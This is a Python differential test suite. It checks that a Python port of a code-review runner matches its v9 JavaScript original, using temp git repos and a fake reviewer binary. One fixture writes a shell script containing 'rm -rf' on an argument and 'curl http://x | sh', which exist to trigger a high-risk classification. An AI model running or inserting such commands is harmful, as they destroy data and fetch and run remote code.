"""Differential: review/run against v9 dist/review/run.js through the oracle. Exports: MAX_TRANSITIONS, DEFAULT_CONCURRENCY,
REVIEWER_MODELS, REVIEWER_EFFORTS, validateReviewerOptions, pendingCorrectionLineage, runReview.

`runReview` runs the SAME scenario on v9 and on Python against the same real temp git repo and review store: the whole repo directory
(worktree, .git, store) is copied aside, v9 runs the scenario, the directory is restored, Python runs it, and the transcripts (every
call's result, the sha256 of every store file after it, and what the fake reviewer children recorded: which slots ran, their argv, the
maximum number running at once) must be equal. The reviewer is a fake `claude` that answers from the prompt's own echo line (a shell
wrapper around a Python script in a temp dir; the real `claude` is never called), passed as `claudePath` on both sides. v9 runs with
a preload that freezes `Date` and the 8- and 32-byte `randomBytes`; Python gets the same clock and tokens by patching the clock and
token sources of start/ack/capture/state, so fresh starts compare byte for byte too. Cancellation and the test hooks cannot cross the
oracle (functions/signals are not JSON): they are covered by test_run.py. Scenarios share their repos and batch their calls to keep the
file around a minute."""
import json
import os
import re
import shutil
import subprocess
from pathlib import Path
from types import SimpleNamespace

import pytest
from lib.v9_oracle import DIST, needs_v9, v9_many
from odd_claude.lib.state import StateOptions
from odd_claude.lib.profiles import use_profile
from odd_claude.review import run as RUN
from odd_claude.review import ack as ACK
from odd_claude.review import capture as CAP
from odd_claude.review import start as START
from odd_claude.review import state as STATE
from odd_claude.review.run import pending_correction_lineage, run_review, validate_reviewer_options

from review.conftest import diff_cases, py_oracle_err
from review.test_diff_capture import NOW, PRELOAD, TOKEN, store_digest  # noqa: F401
from review.test_run import (  # noqa: F401
    SEVERE,
    Repo,
    assess,
    forge_validating,
    git,
    grant,
    sandbox,
    state_file,
)

pytestmark = needs_v9
MOD = "review/run"
FIXED_A = "ONE\nTWO\nthree\nfour\nfive\n"
LINEAGE_HEX = "ab" * 8

PRELOAD8 = PRELOAD + """
const rb8 = crypto.randomBytes;
crypto.randomBytes = (n, cb) => (n === 8 && cb === undefined ? Buffer.alloc(8, 0xab) : rb8(n, cb));
syncBuiltinESMExports();
"""

FAKE_PY = r'''
import json, os, re, sys, time
d = sys.argv[1]
b = json.load(open(os.path.join(d, "behavior.json")))
prompt = sys.stdin.buffer.read().decode("utf-8")
head = re.search(r"Role: (\w+)(?:, lens: (\w+))?\.", prompt)
role, lens = head.group(1), head.group(2)
key = lens or role
log = open(os.path.join(d, "calls.jsonl"), "a")
log.write(json.dumps({"key": key, "args": sys.argv[2:], "t": time.time(), "ev": "start"}) + "\n"); log.flush()
time.sleep((b.get("sleep") or {}).get(key, 0))
log.write(json.dumps({"key": key, "t": time.time(), "ev": "end"}) + "\n"); log.flush()
if key in (b.get("fail") or {}):
    sys.stderr.write("boom")
    sys.exit(1)
if key in (b.get("raw") or {}):
    sys.stdout.write(b["raw"][key]); sys.exit(0)
echo = json.loads(re.search(r"Echo these fields verbatim in the result: (\{.*\})", prompt).group(1))
def section(name):
    return re.search(r"<<<ODD-DATA-\w+ %s>>>\n([\s\S]*?)\n<<<END-ODD-DATA-\w+ %s>>>" % (name, name), prompt).group(1)
if role == "lens":
    result = {**echo, "inspection": {"status": "completed", "paths": section("changed-path-manifest").split("\n")}, "findings": (b.get("findings") or {}).get(lens, []), "evidence": ["reviewed the complete candidate scope"]}
elif role == "refuter":
    ids = [f["id"] for f in json.loads(section("findings"))]
    result = {**echo, "results": [{"finding_id": i, "outcome": "refuted", "proof_refs": ["a.txt:1 handles the empty input"]} for i in ids]}
else:
    result = {**echo, "original_criteria": {"passed": not b.get("validatorFails"), "evidence": ["a.txt:1 now guards the empty input"]}, "correction_regression": {"passed": True, "evidence": ["the regression test passes"]}, "follow_ups": []}
sys.stdout.buffer.write(("```json\n" + json.dumps(result, ensure_ascii=False) + "\n```\n").encode("utf-8"))
'''


class Fake:
    def __init__(self, root: Path, behavior: dict):
        self.dir = root
        (root / "bin").mkdir(parents=True)
        (root / "behavior.json").write_text(json.dumps(behavior))
        (root / "fake.py").write_text(FAKE_PY)
        self.binary = str(root / "bin" / "claude")
        Path(self.binary).write_text(f'#!/bin/sh\nexec "{__import__("sys").executable}" "{root / "fake.py"}" "{root}" "$@"\n')
        os.chmod(self.binary, 0o755)

    def drain(self) -> dict:
        """What the children recorded since the last drain: the slots that ran (sorted), their argv, and the peak number at once."""
        p = self.dir / "calls.jsonl"
        if not p.exists():
            return {"ran": [], "peak": 0}
        events = [json.loads(line) for line in p.read_text().splitlines()]
        p.unlink()
        peak = cur = 0
        for e in sorted(events, key=lambda e: (e["t"], e["ev"] == "start")):
            cur += 1 if e["ev"] == "start" else -1
            peak = max(peak, cur)
        return {"ran": sorted([e["key"], e["args"]] for e in events if e["ev"] == "start"), "peak": peak}


def make_fx(tmp_path, name, unicode_=False, dirty=True):
    d = tmp_path / name
    d.mkdir()
    fx = Repo(d, dirty)
    if unicode_:
        Path(fx.repo, "ünï-☃.txt").write_text("héllo wörld 😀\nsecond line\n", encoding="utf-8")
        git(fx.repo, "add", "ünï-☃.txt")
    return fx


@pytest.fixture
def frozen(tmp_path, monkeypatch):
    """Python gets the clock and the token sources v9 gets from the preload."""
    f = tmp_path / "freeze.mjs"
    f.write_text(PRELOAD8)
    for mod in (ACK, CAP, START):
        monkeypatch.setattr(mod, "_iso_now", lambda: NOW, raising=False)
    monkeypatch.setattr(STATE, "secrets", SimpleNamespace(token_hex=lambda n: "cd" * n))
    monkeypatch.setattr(START, "secrets", SimpleNamespace(token_hex=lambda n: "ab" * n))
    return {"GIT_CONFIG_NOSYSTEM": "1", "NODE_OPTIONS": f"--import={f}"}


class Log(list):
    peaks: list
    v9_peaks: list


class Backend:
    def __init__(self, kind, fx, fake, env):
        self.kind, self.fx, self.fake, self.env, self.log, self.peaks = kind, fx, fake, env, Log(), []

    def _record(self, fn, args, res):
        # the runner reports its own elapsed time in the timeout message; v9 runs under a frozen clock
        res = json.loads(re.sub(r"killed after \d+ms", "killed after Nms", json.dumps(res)))
        drained = self.fake.drain()
        self.peaks.append(drained["peak"])  # timing-dependent: asserted only where the fake sleeps
        self.log.append((fn, args, res, store_digest(self.fx.common_dir), drained["ran"]))
        return res

    def run(self, over=None, deps=None):
        inp = {"cwd": self.fx.repo, "claudePath": self.fake.binary, **(over or {})}
        d = deps or {}
        if self.kind == "v9":
            res = v9_many(MOD, "runReview", [[inp, d]], env=self.env)[0]
        else:
            res = py_oracle_err(run_review, json.loads(json.dumps(inp)), json.loads(json.dumps(d)))
        return self._record("runReview", (over, deps), res)

    def pending(self, target):
        if self.kind == "v9":
            res = v9_many(MOD, "pendingCorrectionLineage", [[self.fx.repo, target]], env=self.env)[0]
        else:
            res = py_oracle_err(pending_correction_lineage, self.fx.repo, target)
        return self._record("pendingCorrectionLineage", (target,), res)

    def finish_run(self, forecast_over=None, deps=None, ack_over=None):
        """The forecast, then the acknowledged run for exactly its binding; returns both results."""
        f = self.run(forecast_over, deps)
        b = f.get("reviewer_run_binding")
        done = self.run({**(forecast_over or {}), "reviewerRunAcknowledged": True, **({"reviewerRunBinding": b} if b else {}), **(ack_over or {})}, deps)
        return f, done


def both(fx, fake, env, scenario):
    """Runs `scenario(call)` on v9, restores the whole repo directory, runs it on Python; asserts equal transcripts; returns the Python log (with the peak concurrency of each side)."""
    root = Path(fx.repo)
    bak = root.parent / "repo-backup"
    shutil.copytree(root, bak, symlinks=True)
    v = Backend("v9", fx, fake, env)
    scenario(v)
    shutil.rmtree(root)
    shutil.copytree(bak, root, symlinks=True)
    shutil.rmtree(bak)
    p = Backend("py", fx, fake, env)
    scenario(p)
    assert len(v.log) == len(p.log)
    for i, (a, b) in enumerate(zip(v.log, p.log)):
        assert a == b, f"step {i} {a[0]} {a[1]!r}:\nv9={a[2:]!r}\npython={b[2:]!r}"
    p.log.peaks, p.log.v9_peaks = p.peaks, v.peaks
    return p.log


def outcomes(log):
    return [e[2].get("outcome") if isinstance(e[2], dict) else None for e in log]


# ---- constants and the pure validator ----

_JS_CONSTS = r"""
const m = await import(process.argv[1]);
process.stdout.write(JSON.stringify({ MAX_TRANSITIONS: m.MAX_TRANSITIONS, DEFAULT_CONCURRENCY: m.DEFAULT_CONCURRENCY, REVIEWER_MODELS: m.REVIEWER_MODELS, REVIEWER_EFFORTS: m.REVIEWER_EFFORTS }));
"""


def test_constants_match_v9():
    r = subprocess.run(["node", "--input-type=module", "-e", _JS_CONSTS, (DIST / "review" / "run.js").as_uri()], capture_output=True, text=True, timeout=60)
    assert r.returncode == 0, r.stderr
    v = json.loads(r.stdout)
    assert (RUN.MAX_TRANSITIONS, RUN.DEFAULT_CONCURRENCY, RUN.REVIEWER_MODELS, RUN.REVIEWER_EFFORTS) == (v["MAX_TRANSITIONS"], v["DEFAULT_CONCURRENCY"], v["REVIEWER_MODELS"], v["REVIEWER_EFFORTS"])


def test_validate_reviewer_options_matches_v9_on_every_combination_and_edge_value():
    values = [None, "", "opus", "sonnet", "haiku", "fable", "OPUS", " opus", "opus\n", "gpt-4", "😀", "ünï", "max", "low", "medium", "high", "xhigh", "ultra", 0, 1, 1.5, True, False, [], ["opus"], {}, {"a": 1}]
    calls = [[{}]] + [[{"model": m}] for m in values] + [[{"effort": e}] for e in values] + [[{"model": m, "effort": e}] for m in values for e in values]
    diff_cases(MOD, "validateReviewerOptions", validate_reviewer_options, calls)


# ---- fresh starts: the default risk assessor, real snapshots, Unicode ----


def test_fresh_low_risk_closes_then_stops_not_due_and_invalid_options_match_v9(tmp_path, frozen):
    fx = make_fx(tmp_path, "low", unicode_=False)
    git(fx.repo, "checkout", "-q", "--", "a.txt")  # docs only: low risk under the real assessor
    Path(fx.repo, "README.md").write_text("# t\n")
    git(fx.repo, "add", "README.md")
    git(fx.repo, "commit", "-q", "-m", "docs")
    Path(fx.repo, "README.md").write_text("# hé\n\nmore ünï docs 😀\n", encoding="utf-8")
    fake = Fake(tmp_path / "fake-low", {})

    def scenario(c):
        c.run()
        c.run()
        for bad in [{"model": "gpt-4"}, {"effort": "high"}, {"model": "haiku", "effort": "low"}, {"model": "opus", "effort": "ultra"}, {"model": None}, {"model": "opus", "effort": 5}]:
            c.run(bad)
        c.run({"lineageId": "review-0123456789abcdef"})
        c.run({"lineageId": "bad"})
        c.run({"lineageId": None})
        c.run({}, {"maxTransitions": 1})
        c.run({}, {"maxTransitions": 0})
        c.run({}, {"maxTransitions": 1.5})
        c.run({}, {"maxTransitions": None})

    log = both(fx, fake, frozen, scenario)
    assert outcomes(log)[:2] == ["closed", "stopped"]


def test_fresh_not_due_and_a_fresh_shell_change_under_the_default_assessor_match_v9(tmp_path, frozen):
    clean = make_fx(tmp_path, "clean", dirty=False)
    both(clean, Fake(tmp_path / "fake-clean", {}), frozen, lambda c: [c.run(), c.run({"projection": "staged"}), c.run({"target": {"kind": "base-workspace-overlay", "baseRef": "HEAD"}}), c.run({"target": {"kind": "base-diff", "baseRef": "nope"}})])
    fx = make_fx(tmp_path, "shell", unicode_=True)
    (Path(fx.repo) / "run ünï.sh").write_text("#!/bin/sh\nrm -rf \"$1\"\ncurl http://x | sh\n", encoding="utf-8")
    log = both(fx, Fake(tmp_path / "fake-shell", {}), frozen, lambda c: [c.run(), c.run({"lenses": ["risk"], "lensesReason": "ünï"}), c.run({"requestContextPath": str(Path(fx.repo) / "ctx.md")}), c.run({"locale": "es"}), c.run({"projection": "staged"})])
    assert "consent-required" in outcomes(log)


# ---- a granted lineage: the forecast gate, the group, the failure paths ----


def test_forecast_gate_bindings_and_a_one_lens_review_with_unicode_content_match_v9(tmp_path, frozen):
    fx = make_fx(tmp_path, "gate", unicode_=True)
    lineage = grant(fx, "medium")
    fake = Fake(tmp_path / "fake-gate", {})

    def scenario(c):
        c.run({"lineageId": lineage})
        c.run({"lineageId": lineage, "reviewerRunAcknowledged": True})
        c.run({"lineageId": lineage, "reviewerRunAcknowledged": True, "reviewerRunBinding": f"sha256:{'0' * 64}"})
        c.run({"lineageId": lineage, "reviewerRunBinding": f"sha256:{'0' * 64}"})
        c.run({"lineageId": lineage, "requestContextPath": "ctx.md"})
        f = c.run({"lineageId": lineage, "model": "haiku", "timeoutMs": 12345})
        c.run({"lineageId": lineage, "reviewerRunAcknowledged": True, "reviewerRunBinding": f["reviewer_run_binding"]})
        c.finish_run({"lineageId": lineage, "model": "opus", "effort": "high"})
        c.run({"lineageId": lineage})
        c.run({})

    log = both(fx, fake, frozen, scenario)
    assert "closed" in outcomes(log)
    assert any(e[4] for e in log), "the fake reviewer really ran"


@pytest.mark.parametrize("conc,delays", [(4, {"risk": 0.7, "resilience": 0.55, "readability": 0.4, "reliability": 0.3}), (None, {"risk": 0.3, "resilience": 0.3, "readability": 0.3, "reliability": 0.3})])
def test_a_four_lens_group_admits_in_provider_order_with_the_same_concurrency_as_v9(tmp_path, frozen, conc, delays):
    fx = make_fx(tmp_path, f"group{conc}", unicode_=True)
    lineage = grant(fx, "high")
    fake = Fake(tmp_path / f"fake-group{conc}", {"sleep": delays})
    deps = {} if conc is None else {"concurrency": conc}
    log = both(fx, fake, frozen, lambda c: c.finish_run({"lineageId": lineage}, deps))
    assert outcomes(log) == ["forecast", "closed"]
    assert log.peaks[1] == log.v9_peaks[1] == (4 if conc == 4 else 2)


def test_reviewer_failures_malformed_output_timeout_and_capture_refusals_match_v9(tmp_path, frozen):
    for name, behavior, over, deps in [
        ("garbage", {"raw": {"resilience": "I could not review this, sorry ünï"}}, {}, {"concurrency": 4}),
        ("exit", {"fail": {"risk": 1}, "sleep": {"resilience": 0.3}}, {}, {"concurrency": 2}),
        ("timeout", {"sleep": {"risk": 5}}, {"timeoutMs": 300}, {}),
        ("echo", {"raw": {"risk": json.dumps({"subject_hash": f"sha256:{'1' * 64}", "inspection": {"status": "completed", "paths": ["a.txt"]}, "findings": [], "evidence": ["x"]})}}, {}, {}),
        ("empty", {"raw": {"risk": ""}}, {}, {}),
        ("two", {"raw": {"risk": "{} {}"}}, {}, {}),
        ("badclaude", {}, {"claudePath": "/nonexistent/claude"}, {}),
    ]:
        fx = make_fx(tmp_path, f"fail-{name}", unicode_=True)
        lineage = grant(fx, "high" if name in ("garbage", "exit") else "medium")
        log = both(fx, Fake(tmp_path / f"fake-fail-{name}", behavior), frozen, lambda c: c.finish_run({"lineageId": lineage, **over}, deps))
        assert outcomes(log)[1] == "blocked", (name, log[1][2])


def test_the_active_profile_route_and_its_drift_match_v9(tmp_path, frozen):
    pdir = tmp_path / "profile"
    pdir.mkdir()
    use_profile("economy", StateOptions(data_dir=str(pdir)))
    deps = {"profileState": {"dataDir": str(pdir)}}
    fx = make_fx(tmp_path, "profrepo")
    lineage = grant(fx, "high")

    def scenario(c):
        f = c.run({"lineageId": lineage}, deps)
        c.run({"lineageId": lineage, "model": "sonnet", "effort": "high"}, deps)
        c.run({"lineageId": lineage, "reviewerRunAcknowledged": True, "reviewerRunBinding": f["reviewer_run_binding"], "model": "opus"}, deps)
        c.finish_run({"lineageId": lineage}, deps)

    log = both(fx, Fake(tmp_path / "fake-profile", {}), frozen, scenario)
    assert outcomes(log) == ["forecast", "forecast", "binding-drift", "forecast", "closed"]
    assert any("haiku" in k[1] for k in log[-1][4]), "the economy profile route reached the children"


def test_a_held_refuter_is_run_and_the_candidate_moving_before_the_run_is_drift_match_v9(tmp_path, frozen):
    from odd_claude.review.artifact import lens_artifact_subject, tree_diff_paths
    from odd_claude.review.capture import capture_lens_result
    from odd_claude.review.store import read_state

    fx = make_fx(tmp_path, "refuter")
    lineage = grant(fx, "medium")
    rec = read_state(fx.common_dir, lineage)
    subject = lens_artifact_subject(fx.common_dir, rec, "risk")
    held = capture_lens_result(
        fx.common_dir, lineage, rec["revision"],
        {"lens": "risk", "subject": subject, "result": {"subject_hash": subject["subject_hash"], "inspection": {"status": "completed", "paths": tree_diff_paths(fx.common_dir, rec["base_tree"], rec["candidate_tree"])}, "findings": [{**SEVERE, "evidence_class": "inferential"}], "evidence": ["x"]}},
        {"awaitRefuter": True, "now": lambda: NOW},
    )
    assert held["ok"]

    def scenario(c):
        c.finish_run({"lineageId": lineage})
        c.run({"lineageId": lineage})

    log = both(fx, Fake(tmp_path / "fake-refuter", {}), frozen, scenario)
    assert outcomes(log)[:2] == ["forecast", "closed"]
    fx2 = make_fx(tmp_path, "moved")
    lineage2 = grant(fx2, "medium")

    def moved(c):
        (Path(fx2.repo) / "a.txt").write_text("moved\non\n")
        c.run({"lineageId": lineage2})
        c.run({"lineageId": lineage2, "reviewerRunAcknowledged": True})

    both(fx2, Fake(tmp_path / "fake-moved", {}), frozen, moved)


# ---- the correction flow ----


def test_the_correction_flow_plan_scope_refusal_validation_and_close_match_v9(tmp_path, frozen):
    fx = make_fx(tmp_path, "corr", unicode_=True)
    lineage = grant(fx, "medium")
    fake = Fake(tmp_path / "fake-corr", {"findings": {"risk": [SEVERE]}})
    target = {"kind": "current-changes", "projection": "workspace"}

    def scenario(c):
        a = Path(fx.repo, "a.txt")
        b = Path(fx.repo, "b.txt")
        c.finish_run({"lineageId": lineage})
        c.run({"lineageId": lineage})
        c.pending(target)
        c.run()
        b.write_text("changed elsewhere ünï\n")
        c.run({"lineageId": lineage})
        b.write_text("bee\n")
        a.write_text(FIXED_A + "x\n" * 400)
        c.run({"lineageId": lineage})
        a.write_text(FIXED_A)
        c.pending(target)
        c.run()
        c.run({"lineageId": lineage, "projection": "staged"})
        c.finish_run({"lineageId": lineage})
        c.run({"lineageId": lineage})
        c.run()

    log = both(fx, fake, frozen, scenario)
    assert "input-required" in outcomes(log) and "closed" in outcomes(log)


def test_a_failing_validator_reopens_then_escalates_and_a_committed_correction_matches_v9(tmp_path, frozen):
    fx = make_fx(tmp_path, "esc")
    lineage = grant(fx, "medium")
    fake = Fake(tmp_path / "fake-esc", {"findings": {"risk": [SEVERE]}, "validatorFails": True})
    target = {"kind": "current-changes", "projection": "workspace"}

    def scenario(c):
        a = Path(fx.repo, "a.txt")
        c.finish_run({"lineageId": lineage})
        git(fx.repo, "commit", "-q", "-am", "reviewed work")
        a.write_text(FIXED_A)
        c.finish_run({"lineageId": lineage})
        a.write_text("UNO\nTWO\nthree\nfour\nfive\n")
        c.pending(target)
        c.run()
        c.finish_run({"lineageId": lineage})
        c.run()
        c.pending(target)

    log = both(fx, fake, frozen, scenario)
    assert "stopped" in outcomes(log)


def test_a_moved_base_and_a_projection_change_during_a_correction_are_drift_like_v9(tmp_path, frozen):
    fx = make_fx(tmp_path, "drift")
    lineage = grant(fx, "medium")
    fake = Fake(tmp_path / "fake-drift", {"findings": {"risk": [SEVERE]}})

    def scenario(c):
        a, b = Path(fx.repo, "a.txt"), Path(fx.repo, "b.txt")
        c.finish_run({"lineageId": lineage})
        a.write_text(FIXED_A)
        git(fx.repo, "add", "a.txt")
        c.run({"lineageId": lineage, "projection": "staged"})
        b.write_text("bee\nmoved base\n")
        git(fx.repo, "add", "b.txt")
        git(fx.repo, "commit", "-q", "-m", "move the base")
        c.run({"lineageId": lineage})

    both(fx, fake, frozen, scenario)


@pytest.mark.parametrize("shape", ["identity", "tree"])
def test_forged_and_unsafe_correction_lineages_fail_closed_like_v9(tmp_path, frozen, shape):
    fx = make_fx(tmp_path, f"forged-{shape}")
    lineage = grant(fx, "medium")
    from odd_claude.review.capture import capture_lens_result  # noqa: F401

    fake = Fake(tmp_path / f"fake-forged-{shape}", {"findings": {"risk": [SEVERE]}})
    # drive the lineage to correction_required through Python once (shared setup), then snapshot that state for both sides
    seed = Backend("py", fx, fake, frozen)
    seed.finish_run({"lineageId": lineage})
    forge_validating(fx, lineage, shape)
    target = {"kind": "current-changes", "projection": "workspace"}

    def scenario(c):
        c.run({"lineageId": lineage})
        c.pending(target)
        Path(fx.repo, "a.txt").write_text(FIXED_A)
        c.run({"lineageId": lineage})
        c.run()
        c.pending(target)

    log = both(fx, fake, frozen, scenario)
    assert all(o == "blocked" for o in outcomes(log) if o)


def test_a_symlinked_state_file_of_an_unrelated_lineage_blocks_like_v9(tmp_path, frozen):
    fx = make_fx(tmp_path, "symlink")
    lineage = grant(fx, "medium")
    fake = Fake(tmp_path / "fake-symlink", {"findings": {"risk": [SEVERE]}})
    Backend("py", fx, fake, frozen).finish_run({"lineageId": lineage})
    f = state_file(fx, lineage)
    alias = tmp_path / "alias.json"
    alias.write_bytes(Path(f).read_bytes())
    os.remove(f)
    os.symlink(alias, f)
    git(fx.repo, "commit", "-q", "-am", "x")
    Path(fx.repo, "b.txt").write_text("bee\ny\n")
    log = both(fx, fake, frozen, lambda c: [c.run(), c.pending({"kind": "current-changes", "projection": "workspace"}), c.run({"lineageId": lineage})])
    assert outcomes(log)[0] == "blocked"


# ---- mixed v9/Python lineages: each step on its own side must read what the other wrote ----


def _mixed(fx, fake, env, steps):
    """Runs `steps` ([(side, fn(backend))]) all on v9, restores the repo, then each step on its own side; the transcripts must be equal."""
    root = Path(fx.repo)
    bak = root.parent / "repo-backup"
    shutil.copytree(root, bak, symlinks=True)
    v = Backend("v9", fx, fake, env)
    for _, fn in steps:
        fn(v)
    shutil.rmtree(root)
    shutil.copytree(bak, root, symlinks=True)
    shutil.rmtree(bak)
    shared = []
    sides = {"v9": Backend("v9", fx, fake, env), "py": Backend("py", fx, fake, env)}
    for b in sides.values():
        b.log = shared
    for side, fn in steps:
        fn(sides[side])
    assert len(v.log) == len(shared)
    for i, (a, b) in enumerate(zip(v.log, shared)):
        assert a[2:] == b[2:], f"step {i}: v9={a[2:]!r} mixed={b[2:]!r}"
    return shared


def _ack(c, lineage, f):
    return c.run({"lineageId": lineage, "reviewerRunAcknowledged": True, "reviewerRunBinding": f["reviewer_run_binding"]}, {"concurrency": 4})


@pytest.mark.parametrize("first,second", [("py", "v9"), ("v9", "py")])
def test_mixed_high_risk_group_forecast_on_one_side_run_on_the_other(tmp_path, frozen, first, second):
    fx = make_fx(tmp_path, f"mix-{first}", unicode_=True)
    lineage = grant(fx, "high")
    fake = Fake(tmp_path / f"fake-mix-{first}", {"sleep": {"risk": 0.2}})
    box = {}
    log = _mixed(fx, fake, frozen, [
        (first, lambda c: box.__setitem__("f", c.run({"lineageId": lineage}, {"concurrency": 4}))),
        (second, lambda c: _ack(c, lineage, box["f"])),
        (first, lambda c: c.run({"lineageId": lineage})),
    ])
    assert [e[2]["outcome"] for e in log] == ["forecast", "closed", "stopped"]


@pytest.mark.parametrize("first,second", [("py", "v9"), ("v9", "py")])
def test_mixed_correction_started_on_one_side_validated_and_closed_on_the_other(tmp_path, frozen, first, second):
    fx = make_fx(tmp_path, f"mixc-{first}")
    lineage = grant(fx, "medium")
    fake = Fake(tmp_path / f"fake-mixc-{first}", {"findings": {"risk": [SEVERE]}})
    box = {}

    def fix(c):
        Path(fx.repo, "a.txt").write_text(FIXED_A)
        box["f2"] = c.run({"lineageId": lineage})

    log = _mixed(fx, fake, frozen, [
        (first, lambda c: box.__setitem__("f", c.run({"lineageId": lineage}))),
        (first, lambda c: _ack(c, lineage, box["f"])),
        (second, fix),
        (first, lambda c: _ack(c, lineage, box["f2"])),
    ])
    assert [e[2]["outcome"] for e in log] == ["forecast", "input-required", "forecast", "closed"]
